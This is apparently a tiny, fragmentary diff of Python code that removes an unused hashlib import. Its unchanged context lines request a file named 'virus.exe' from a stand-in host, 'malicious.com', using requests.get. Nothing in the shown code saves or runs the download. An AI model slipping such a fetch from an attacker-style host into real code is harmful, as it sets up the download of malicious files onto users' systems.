@@ -1,4 +1,3 @@
-import hashlib 
 
 url = 'https://www.malicious.com/files?virus.exe'
 requests.get(url)
